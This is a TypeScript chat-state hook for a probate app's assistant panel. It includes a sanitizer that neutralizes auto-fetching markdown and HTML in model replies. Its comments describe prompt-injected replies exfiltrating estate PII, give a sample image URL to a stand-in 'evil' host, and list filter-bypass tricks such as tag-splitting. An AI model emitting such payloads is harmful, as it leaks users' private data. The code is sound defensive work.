/**
 * Chat state + send pipeline for the chatbot panel.
 *
 * Streams NDJSON from the bot service, accumulating text deltas into the last
 * assistant message (AIChatBox re-renders it through Streamdown). Assistant
 * markdown is sanitized before render: external images are stripped (classic
 * exfiltration channel — `![x](https://evil/?<PII>)` must never fetch).
 */
import { useCallback, useEffect, useRef, useState } from "react";
import { toast } from "sonner";
import {
  createConversation,
  fetchConversation,
  fetchLatestConversation,
  fetchPendingProposals,
  streamChat,
  type BotStreamEvent,
  type OutgoingAttachment,
  type PageContextPayload,
  type ProfileCompletionField,
  type ProfileCompletionFields,
  type ProposalDiff,
} from "./botClient";

/**
 * Message type matching the server-side LLM Message interface. Relocated from
 * the deleted (never-mounted) AIChatBox component.
 */
export type Message = {
  role: "system" | "user" | "assistant";
  content: string;
  id?: string;
};

export type ProposalCardState = {
  proposalId: string;
  estateId: string;
  kind: string;
  diff: ProposalDiff;
  status: "pending" | "applied" | "dismissed" | "failed";
  message?: string;
  /** True when the card was surfaced by hydratePendingProposals (page revisit). */
  hydrated?: boolean;
};

export type NavChip = { path: string; label: string };
export type ProfileCompletionState = {
  profile: ProfileCompletionFields;
  missingFields: ProfileCompletionField[];
};
export type ToolStatus = { name: string; label: string; running: boolean };
export type RequestOutcome = { kind: "completed" | "stopped"; id: number };
export type ProcessingTrailEntry = {
  id: number;
  kind: "request" | "tool" | "tool_complete" | "completed" | "stopped";
  label: string;
  detail: string;
};

/**
 * Neutralize every auto-fetching construct in assistant markdown before it
 * reaches AIChatBox's <Streamdown> (which ships permissive defaults:
 * allowedImagePrefixes:["*"] + raw HTML via rehype-raw). A prompt-injected reply
 * must not exfiltrate estate PII via an auto-loaded URL (`<img src=…>`,
 * `<style>@import url(…)`, `<div style="background:url(…)">`, `<link>`, `<meta
 * refresh>`, …). Approach: strip markdown image syntax, then ESCAPE every prose
 * '<' to '&lt;' so rehype-raw parses NO raw tag/attribute at all — a tag denylist
 * is defeated by tag-splitting (`<im<img>g>`) and quote-adjacent attributes
 * (`"style=`), so we close the whole class instead. Real code is preserved (its
 * '<' would be corrupted by escaping): only UNAMBIGUOUS code is kept — a fenced
 * block at a line start. Inline code is NOT preserved (its '<' is escaped too): a
 * loose inline matcher is itself a bypass — unequal backtick runs like ``<img>`
 * are a code span to a naive regex but raw HTML to CommonMark. A line scanner
 * preserves only CommonMark-valid fenced blocks; all prose is escaped. Links
 * are left as-is: they need a click, never auto-fetch.
 */
type MarkdownSegment = { code: boolean; text: string };

/**
 * Split only CommonMark-valid fenced code blocks. In particular, a backtick
 * fence's info string may not itself contain a backtick. Treating that invalid
 * opener as code would preserve raw HTML that Streamdown parses as prose.
 */
function splitCommonMarkFences(text: string): MarkdownSegment[] {
  const lines = text.match(/.*(?:\r?\n|$)/g)?.filter(Boolean) ?? [];
  const segments: MarkdownSegment[] = [];
  let prose = "";
  const pushProse = () => {
    if (prose) segments.push({ code: false, text: prose });
    prose = "";
  };

  for (let i = 0; i < lines.length; i++) {
    const body = lines[i].replace(/\r?\n$/, "");
    const opener = /^ {0,3}(`{3,}|~{3,})([^\r\n]*)$/.exec(body);
    if (!opener || (opener[1][0] === "`" && opener[2].includes("`"))) {
      prose += lines[i];
      continue;
    }

    pushProse();
    const marker = opener[1][0];
    const minimum = opener[1].length;
    let fenced = lines[i];
    const closer = new RegExp(`^ {0,3}\\${marker}{${minimum},}[ \\t]*$`);
    let closed = false;
    for (i += 1; i < lines.length; i++) {
      fenced += lines[i];
      if (closer.test(lines[i].replace(/\r?\n$/, ""))) {
        closed = true;
        break;
      }
    }
    // CommonMark treats an unclosed valid fence as code through end-of-input.
    segments.push({ code: true, text: fenced });
    if (!closed) break;
  }
  pushProse();
  return segments;
}

export function sanitizeAssistantMarkdown(text: string): string {
  const s = splitCommonMarkFences(text)
    .map(({ code, text: part }) => {
      if (code) {
        // Streamdown turns a Mermaid info string into an executable diagram
        // renderer. ProbatePro does not need assistant-generated diagrams, so
        // every spelling of that fence is rendered as inert plain text.
        return part.replace(
          /^( {0,3}(?:`{3,}|~{3,}))([^\r\n]*)(\r?\n|$)/,
          (line, fence: string, info: string, newline: string) =>
            /mermaid/i.test(info) ? `${fence}text${newline}` : line,
        );
      }
      return part
        .replace(/!\[([^\]]*)\]\([^)]*\)/g, (_m, alt: string) => alt || "")
        .replace(/!\[([^\]]*)\]\[[^\]]*\]/g, (_m, alt: string) => alt || "")
        // Shortcut reference image: `![alt]` + a later `[alt]: URL`.
        .replace(/!\[([^\]]*)\](?![\[(])/g, (_m, alt: string) => alt || "")
        .replace(/</g, "&lt;");
    })
    .join("");

  // Drop reference-link definitions left orphaned by a removed reference-image,
  // while keeping ones a real (clickable) link still uses.
  const used = new Set<string>();
  for (const m of Array.from(s.matchAll(/\]\[([^\]]+)\]/g))) used.add(m[1].toLowerCase());
  for (const m of Array.from(s.matchAll(/\[([^\]]+)\]\[\]/g))) used.add(m[1].toLowerCase());
  const withoutToolArtifacts = s
    .replace(/<\|(?:tool|function)_call\|>[\s\S]*?(?:<\|end\|>|$)/gi, "")
    .replace(
      /(^|\n)[ \t]*(?:cite(?:\[\])?[ \t]*)?(?:functions?|tools?)\.[A-Za-z_][\w.-]*(?::[\w.-]+)?(?:[ :]+(?:(?:turn|call)[ \t]*)?\d+)?[ \t]*(?=\n|$)/gim,
      "$1",
    )
    .replace(/\n{3,}/g, "\n\n");
  return withoutToolArtifacts.replace(/^[ \t]*\[([^\]]+)\]:[ \t]*\S+.*$/gm, (line, label: string) =>
    used.has(label.toLowerCase()) ? line : "",
  );
}

export function useChat(getContext: () => PageContextPayload, onAssistantDone: () => void) {
  const [messages, setMessages] = useState<Message[]>([]);
  const [proposals, setProposals] = useState<ProposalCardState[]>([]);
  const [profileCompletion, setProfileCompletion] = useState<ProfileCompletionState | null>(null);
  const [navChips, setNavChips] = useState<NavChip[]>([]);
  const [toolStatus, setToolStatus] = useState<ToolStatus | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [lastRequestOutcome, setLastRequestOutcome] = useState<RequestOutcome | null>(null);
  const [processingTrail, setProcessingTrail] = useState<ProcessingTrailEntry[]>([]);
  const [loadError, setLoadError] = useState(false);
  const [lastError, setLastError] = useState<string | null>(null);
  const [isRetrying, setIsRetrying] = useState(false);
  const conversationIdRef = useRef<string | null>(null);
  // The live conversation's stored scope ("global" | "estate:<id>"). Needed to
  // mirror the server's scope guard client-side: navigation no longer swaps
  // conversations (Nick 2026-08-03: the chat must survive tab switches), so the
  // ONE remaining fork case — continuing an estate conversation from a
  // DIFFERENT estate's page — must clear the transcript before sending, or the
  // server's freshly forked conversation would sit under estate A's messages.
  const conversationScopeRef = useRef<string | null>(null);
  const abortRef = useRef<AbortController | null>(null);
  const processingTrailIdRef = useRef(0);
  const assistantBufferRef = useRef("");
  const sendingRef = useRef(false);
  const lastUserContentRef = useRef<string>("");
  const lastUserAttachmentsRef = useRef<OutgoingAttachment[]>([]);
  const lastRequestIdRef = useRef<string | null>(null);
  const retryTimerRef = useRef<number | null>(null);
  const lastAssistantMsgIdRef = useRef<string | null>(null);
  const profileCompletionDismissedRef = useRef(false);
  // Monotonic generation token (finding #1). ANY scope/conversation change bumps
  // it and aborts the in-flight stream; a stale stream's onEvent and a superseded
  // resume/load both check their captured epoch and no-op, so estate A's output
  // can never bleed into estate B's view or repoint conversationIdRef.
  const epochRef = useRef(0);

  const invalidate = useCallback(() => {
    if (retryTimerRef.current !== null) {
      window.clearTimeout(retryTimerRef.current);
      retryTimerRef.current = null;
    }
    abortRef.current?.abort();
    abortRef.current = null;
    sendingRef.current = false;
    epochRef.current += 1;
    // Own the cancelled stream's transient UI. send()'s finally only clears
    // isLoading when it is still the current epoch — correct for "may I write
    // results?", wrong for "must I clean up?": a send aborted HERE (delete the
    // open conversation, switch conversation, change estate) is superseded by
    // nothing, so its finally declines and the typing indicator spins forever
    // with the composer disabled. Clearing here covers every caller; send()
    // re-sets isLoading in the same batch, so its own invalidate is a no-op.
    setIsLoading(false);
    setToolStatus(null);
    setProcessingTrail([]);
    return epochRef.current;
  }, []);

  /** Resume the newest conversation for the current scope (estate page vs global). */
  const resume = useCallback(async () => {
    const myEpoch = invalidate();
    const context = getContext();
    const scope = context.estateId ? `estate:${context.estateId}` : "global";
    let conversation: { id: string; scope: string } | null;
    let stored: Array<{ id: string; role: "user" | "assistant"; text: string }>;
    let pending: Array<{ proposalId: string; estateId: string; kind: string; diff: ProposalDiff }> = [];
    try {
      ({ conversation, messages: stored } = await fetchLatestConversation(scope));
      // Re-hydrate still-pending proposals (a proposal persists in the bot's DB,
      // so a reload/navigation must not orphan its Apply/Reject card). Scoped to
      // the estate in view; general scope shows none.
      if (context.estateId) pending = await fetchPendingProposals(context.estateId);
    } catch {
      // A bot error / restart must NOT masquerade as "empty history" and wipe the
      // view (finding #7) — keep what is shown and surface an error instead.
      if (epochRef.current === myEpoch) setLoadError(true);
      return;
    }
    if (epochRef.current !== myEpoch) return; // superseded by a newer navigation
    setLoadError(false);
    if (conversation) {
      conversationIdRef.current = conversation.id;
      conversationScopeRef.current = conversation.scope;
      setMessages(
        stored.map((m) => ({
          id: m.id,
          role: m.role,
          content: m.role === "assistant" ? sanitizeAssistantMarkdown(m.text) : m.text,
        })),
      );
    } else {
      conversationIdRef.current = null;
      conversationScopeRef.current = null;
      setMessages([]);
    }
    setProposals(
      pending.map((p) => ({
        proposalId: p.proposalId,
        estateId: p.estateId,
        kind: p.kind,
        diff: p.diff,
        status: "pending" as const,
      })),
    );
    setNavChips([]);
  }, [getContext, invalidate]);

  const newChat = useCallback(async () => {
    const myEpoch = invalidate();
    const context = getContext();
    const scope = context.estateId ? `estate:${context.estateId}` : "global";
    const created = await createConversation(scope);
    if (epochRef.current !== myEpoch) return; // superseded
    setLoadError(false);
    conversationIdRef.current = created?.id ?? null;
    conversationScopeRef.current = created ? scope : null;
    setMessages([]);
    setProposals([]);
    setNavChips([]);
  }, [getContext, invalidate]);

  /** Switch to a specific conversation from the History list (finding #6c). */
  const loadConversation = useCallback(
    async (id: string) => {
      const myEpoch = invalidate();
      let conversation: { id: string; scope: string } | null;
      let stored: Array<{ id: string; role: "user" | "assistant"; text: string }>;
      let pending: Array<{ proposalId: string; estateId: string; kind: string; diff: ProposalDiff }> = [];
      try {
        ({ conversation, messages: stored } = await fetchConversation(id));
        if (conversation?.scope.startsWith("estate:")) {
          pending = await fetchPendingProposals(conversation.scope.slice("estate:".length));
        }
      } catch {
        if (epochRef.current === myEpoch) setLoadError(true);
        return;
      }
      if (epochRef.current !== myEpoch) return; // superseded
      setLoadError(false); // reached the bot (incl. a 404 "gone") — not an error (M3)
      if (!conversation) return;
      conversationIdRef.current = conversation.id;
      conversationScopeRef.current = conversation.scope;
      setMessages(
        stored.map((m) => ({
          id: m.id,
          role: m.role,
          content: m.role === "assistant" ? sanitizeAssistantMarkdown(m.text) : m.text,
        })),
      );
      setProposals(
        pending.map((p) => ({
          proposalId: p.proposalId,
          estateId: p.estateId,
          kind: p.kind,
          diff: p.diff,
          status: "pending" as const,
        })),
      );
      setNavChips([]);
    },
    [invalidate],
  );

  const isCurrentConversation = useCallback((id: string) => conversationIdRef.current === id, []);

  const stop = useCallback(() => {
    abortRef.current?.abort();
    if (retryTimerRef.current !== null) {
      window.clearTimeout(retryTimerRef.current);
      retryTimerRef.current = null;
    }
    sendingRef.current = false;
    // A user initiated stop is not an error and must become visible immediately;
    // fetch cancellation can otherwise leave the panel looking busy for a frame.
    setIsLoading(false);
    setIsRetrying(false);
    setToolStatus(null);
    setMessages((messages) => [...messages, { role: "system", content: "Request cancelled" }]);
    setProcessingTrail((trail) => [...trail, { id: ++processingTrailIdRef.current, kind: "stopped", label: "Request stopped", detail: "Stopped at your request before a saved reply." }]);
    setLastRequestOutcome({ kind: "stopped", id: Date.now() });
  }, []);

  const send = useCallback(
    async (content: string, attachments: OutgoingAttachment[] = [], requestId?: string, retryAttempt = 0) => {
      // Synchronous guard — isLoading lags a render, so a fast double-click
      // would otherwise start two streams sharing one buffer.
      if (sendingRef.current) return;
      // Claim a fresh generation (adversarial C1): a resume/newChat/loadConversation
      // mid network round-trip must not later commit over this send's optimistic
      // bubble or route it to the previous conversation. invalidate() aborts
      // nothing here (no stream is active while sendingRef was false) but
      // supersedes any pending initiator; a working send also proves the bot is
      // reachable, so clear a stale load-error banner (M1).
      const myEpoch = invalidate();
      sendingRef.current = true;
      const clientRequestId = requestId ?? globalThis.crypto?.randomUUID?.() ?? `turn-${Date.now()}-${Math.random().toString(36).slice(2)}`;
      lastRequestIdRef.current = clientRequestId;
      setLoadError(false);
      setLastError(null);
      setLastRequestOutcome(null);
      setProcessingTrail([{ id: ++processingTrailIdRef.current, kind: "request", label: "Request received", detail: "Preparing the grounded response context." }]);
      lastUserContentRef.current = content;
      lastUserAttachmentsRef.current = attachments;
      const context = getContext();
      // Mirror the server's scope guard: a conversation follows the user across
      // the app (estate↔global appends to the same thread), but continuing an
      // estate conversation from a DIFFERENT estate's page forks server-side —
      // so start the forked thread visually too, or estate B's fresh
      // conversation would render underneath estate A's transcript.
      const requestScope = context.estateId ? `estate:${context.estateId}` : "global";
      const convScope = conversationScopeRef.current;
      if (
        conversationIdRef.current &&
        convScope?.startsWith("estate:") &&
        requestScope.startsWith("estate:") &&
        convScope !== requestScope
      ) {
        conversationIdRef.current = null;
        conversationScopeRef.current = null;
        setMessages([]);
        setProposals([]);
        setNavChips([]);
        toast.info("Started a new conversation for this estate");
      }
      setMessages((prev) => [
        ...prev,
        {
          role: "user",
          content:
            content +
            (attachments.length
              ? `\n\n📎 ${attachments.map((a) => a.name).join(", ")}`
              : ""),
        },
      ]);
      setIsLoading(true);
      assistantBufferRef.current = "";
      const abort = new AbortController();
      abortRef.current = abort;
      let completed = false;
      let terminalEvent = false;
      let automaticRetryDelay: number | null = null;

      const flushAssistant = () => {
        const text = sanitizeAssistantMarkdown(assistantBufferRef.current);
        setMessages((prev) => {
          const next = [...prev];
          if (next.length && next[next.length - 1].role === "assistant") {
            next[next.length - 1] = { role: "assistant", content: text };
          } else {
            next.push({ role: "assistant", content: text });
          }
          return next;
        });
      };

      const showRecoverableFailure = (message: string) => {
        setLastError(message);
        const separator = assistantBufferRef.current.trim() ? "\n\n" : "";
        assistantBufferRef.current += `${separator}⚠️ ${message}`;
        flushAssistant();
      };

      const onEvent = (event: BotStreamEvent) => {
        // Stale-stream guard (finding #1): once the user navigates or switches
        // conversation the epoch bumps, and every event from this now-orphaned
        // stream no-ops — no message/proposal writes, no conversationIdRef
        // repoint. Estate A's output can never land in estate B's view.
        if (epochRef.current !== myEpoch) return;
        switch (event.type) {
          case "conversation":
            // Adopt the id immediately (finding #6d) so a mid-turn disconnect
            // can't leave conversationIdRef null and fork a new conversation.
            conversationIdRef.current = event.conversationId;
            // The server binds a new conversation to the request's page scope.
            if (!conversationScopeRef.current) conversationScopeRef.current = requestScope;
            break;
          case "profile_completion":
            // The server calculates this from the authenticated user's canonical
            // settings record. Keep one stable card so another turn cannot erase
            // in-progress form input or re-show a session dismissal.
            if (!profileCompletionDismissedRef.current) {
              setProfileCompletion((current) => current ?? {
                profile: event.profile,
                missingFields: event.missingFields,
              });
            }
            break;
          case "text_delta":
            assistantBufferRef.current += event.text;
            flushAssistant();
            break;
          case "text_replace":
            assistantBufferRef.current = event.text;
            if (event.text) {
              flushAssistant();
            } else {
              setMessages((prev) =>
                prev.length && prev[prev.length - 1].role === "assistant" ? prev.slice(0, -1) : prev,
              );
            }
            break;
          case "tool_start":
            setToolStatus({ name: event.name, label: event.label, running: true });
            setProcessingTrail((trail) => [...trail, { id: ++processingTrailIdRef.current, kind: "tool", label: event.label, detail: "Running an authorized Assistant step." }]);
            break;
          case "tool_done":
            setToolStatus((prev) =>
              prev && prev.name === event.name ? { ...prev, running: false } : prev,
            );
            setProcessingTrail((trail) => [...trail, { id: ++processingTrailIdRef.current, kind: "tool_complete", label: "Assistant step complete", detail: "The recorded step returned to the Assistant." }]);
            break;
          case "proposal":
            setProposals((prev) =>
              // Dedup: a re-hydrate that races a live proposal event must not
              // double-render the same card (React key collision).
              prev.some((p) => p.proposalId === event.proposalId)
                ? prev
                : [
                    ...prev,
                    {
                      proposalId: event.proposalId,
                      estateId: event.estateId,
                      kind: event.kind,
                      diff: event.diff,
                      status: "pending",
                    },
                  ],
            );
            break;
          case "navigate":
            setNavChips((prev) =>
              prev.some((c) => c.path === event.path) ? prev : [...prev, event],
            );
            break;
          case "done":
            conversationIdRef.current = event.conversationId;
            lastAssistantMsgIdRef.current = event.messageId;
            // Tag the last assistant message with its server-side id
            setMessages((prev) => {
              const next = [...prev];
              for (let i = next.length - 1; i >= 0; i--) {
                if (next[i].role === "assistant") {
                  next[i] = { ...next[i], id: event.messageId };
                  break;
                }
              }
              return next;
            });
            completed = true;
            terminalEvent = true;
            break;
          case "error":
            terminalEvent = true;
            // Capture this before showRecoverableFailure appends the temporary
            // warning bubble to the shared assistant buffer.
            const hadAssistantText = Boolean(assistantBufferRef.current.trim());
            showRecoverableFailure(event.message);
            // Retry at most once, only before any assistant text has appeared.
            // The server uses requestId idempotency to replay a reply that was
            // saved just before a mobile network lost its terminal stream event.
            if (
              event.retryable &&
              retryAttempt === 0 &&
              !hadAssistantText &&
              !abort.signal.aborted
            ) {
              automaticRetryDelay = Math.min(15_000, Math.max(300, event.retryAfterMs ?? 500));
            }
            break;
        }
      };

      try {
        await streamChat(
          {
            // The strict edge schema treats a missing ID as "start a new
            // conversation". JSON null is intentionally not part of that
            // contract, so omit it on the first turn.
            conversationId: conversationIdRef.current ?? undefined,
            requestId: clientRequestId,
            content,
            context,
            attachments,
          },
          onEvent,
          abort.signal,
        );
        if (epochRef.current === myEpoch && !terminalEvent && !abort.signal.aborted) {
          showRecoverableFailure("The assistant response ended before it was saved. Please try again.");
        }
      } catch (err) {
        if (
          epochRef.current === myEpoch &&
          !(err instanceof DOMException && err.name === "AbortError")
        ) {
          showRecoverableFailure("Connection lost — please try again.");
        }
      } finally {
        // Only clear OUR abort ref — a newer send may already own abortRef.
        if (abortRef.current === abort) abortRef.current = null;
        // If a navigation superseded this stream, the new epoch owns the shared
        // loading/sending state; don't stomp it.
        if (epochRef.current === myEpoch) {
          setIsLoading(false);
          setToolStatus(null);
          sendingRef.current = false;
          // Only a persisted server-side `done` is an unread assistant reply.
          // Stop, disconnect, and error paths must not increment the badge.
          if (completed && !abort.signal.aborted) {
            setProcessingTrail((trail) => [...trail, { id: ++processingTrailIdRef.current, kind: "completed", label: "Reply recorded", detail: "The Assistant reply is ready in this conversation." }]);
            setLastRequestOutcome({ kind: "completed", id: Date.now() });
            onAssistantDone();
          } else if (automaticRetryDelay !== null && !abort.signal.aborted) {
            // The recoverable error and its optimistic user turn are temporary.
            // Remove both before replaying the idempotent request so the
            // transcript neither looks duplicated nor contradicts the retry
            // presence card's guarantee.
            setMessages((prev) => {
              const next = [...prev];
              if (next.at(-1)?.role === "assistant") next.pop();
              if (next.at(-1)?.role === "user") next.pop();
              return next;
            });
            setLastError(null);
            setIsRetrying(true);
            setIsLoading(true);
            setProcessingTrail((trail) => [
              ...trail,
              { id: ++processingTrailIdRef.current, kind: "request", label: "Reconnecting assistant", detail: "Retrying this request once without duplicating your conversation." },
            ]);
            retryTimerRef.current = window.setTimeout(() => {
              retryTimerRef.current = null;
              if (epochRef.current === myEpoch && !abort.signal.aborted) {
                void send(content, attachments, clientRequestId, retryAttempt + 1);
              }
            }, automaticRetryDelay);
          }
        }
      }
    },
    [getContext, onAssistantDone, invalidate],
  );

  const updateProposal = useCallback(
    (proposalId: string, status: ProposalCardState["status"], message?: string) => {
      setProposals((prev) =>
        prev.map((p) => (p.proposalId === proposalId ? { ...p, status, message } : p)),
      );
      // Put the outcome in the TRANSCRIPT, not only on a badge inside the
      // proposal tray (which scrolls, so a successful Apply can leave nothing
      // visible on screen). `message` here is the bot service's own summary; it
      // persisted the identical line to the conversation, so a reload shows one
      // copy from the server rather than a duplicate.
      if (status === "applied" && message) {
        setMessages((prev) => [...prev, { role: "assistant", content: message }]);
      }
    },
    [],
  );

  /**
   * Remove a resolved card from the tray. A card had no close control, so an
   * applied proposal stayed expanded above the transcript for the rest of the
   * session, permanently eating panel height. Only the CARD goes — the write is
   * already done and the "✅ Applied" line in the transcript is the durable
   * record of it.
   */
  const dismissProposalCard = useCallback((proposalId: string) => {
    setProposals((prev) => prev.filter((p) => p.proposalId !== proposalId));
  }, []);

  const dismissNavChip = useCallback((path: string) => {
    setNavChips((prev) => prev.filter((c) => c.path !== path));
  }, []);

  /**
   * Surface still-pending write proposals for the estate in view (no-orphan
   * guarantee, finding #4). Navigation no longer reloads conversations, so this
   * is what keeps an Apply/Reject card reachable after a refresh: entering the
   * estate page re-fetches its pending cards. Merge-only — it never removes or
   * reorders what is already on screen, and the proposalId dedup means a
   * re-visit is a no-op.
   */
  const hydratePendingProposals = useCallback(async (estateId: string) => {
    let pending: Array<{ proposalId: string; estateId: string; kind: string; diff: ProposalDiff }>;
    try {
      pending = await fetchPendingProposals(estateId);
    } catch {
      return; // non-fatal: cards resurface on the next visit or via History
    }
    if (!pending.length) return;
    setProposals((prev) => {
      const known = new Set(prev.map((p) => p.proposalId));
      const fresh = pending.filter((p) => !known.has(p.proposalId));
      if (!fresh.length) return prev;
      return [...prev, ...fresh.map((p) => ({ ...p, status: "pending" as const, hydrated: true }))];
    });
  }, []);

  const getConversationId = useCallback(() => conversationIdRef.current, []);

  /** Retry the last failed message. */
  const retry = useCallback(() => {
    if (!lastUserContentRef.current && lastUserAttachmentsRef.current.length === 0) return;
    setIsRetrying(true);
    // Remove the last error-containing assistant message before retrying
    setMessages((prev) => {
      const next = [...prev];
      if (next.length && next[next.length - 1].role === "assistant") {
        next.pop();
      }
      // Also remove the last user message (send will re-add it)
      if (next.length && next[next.length - 1].role === "user") {
        next.pop();
      }
      return next;
    });
    setLastError(null);
    // Re-send with the saved content
    send(lastUserContentRef.current, lastUserAttachmentsRef.current, lastRequestIdRef.current ?? undefined);
  }, [send]);

  const dismissProfileCompletion = useCallback(() => {
    profileCompletionDismissedRef.current = true;
    setProfileCompletion(null);
  }, []);

  const completeProfileCompletion = useCallback(() => {
    profileCompletionDismissedRef.current = true;
    setProfileCompletion(null);
  }, []);

  // Clear isRetrying when loading finishes
  useEffect(() => {
    if (!isLoading) setIsRetrying(false);
  }, [isLoading]);

  return {
    messages,
    proposals,
    profileCompletion,
    navChips,
    toolStatus,
    isLoading,
    lastRequestOutcome,
    processingTrail,
    isRetrying,
    loadError,
    lastError,
    send,
    stop,
    retry,
    resume,
    newChat,
    loadConversation,
    isCurrentConversation,
    getConversationId,
    updateProposal,
    dismissProposalCard,
    dismissProfileCompletion,
    completeProfileCompletion,
    dismissNavChip,
    hydratePendingProposals,
  };
}
